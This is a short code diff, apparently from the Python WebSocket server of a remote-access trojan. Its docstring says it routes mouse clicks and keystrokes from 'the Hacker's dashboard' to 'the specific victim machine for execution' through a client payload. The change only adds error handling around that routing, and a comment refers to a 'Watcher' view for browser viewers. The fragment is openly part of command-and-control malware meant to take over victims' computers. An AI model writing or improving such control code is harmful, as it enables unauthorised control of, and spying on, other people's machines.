@@ -86,10 +86,13 @@ def handle_input_event(data):
     Receives mouse clicks and keystrokes from the Hacker's dashboard
     and routes them to the specific victim machine for execution.
     """
-    client_id = data.get('client_id')
-    if client_id:
-        # Send the action down to the specific client payload
-        emit('execute_input', data, room=f"host_{client_id}")
+    try:
+        client_id = data.get('client_id')
+        if client_id:
+            # Send the action down to the specific client payload
+            emit('execute_input', data, room=f"host_{client_id}")
+    except Exception as e:
+        print(f"[!] Target Routing Error: {e}")
 
 # ---------------------------------------------------------
 # WebSockets: Handling Browser Viewers (The "Watcher")
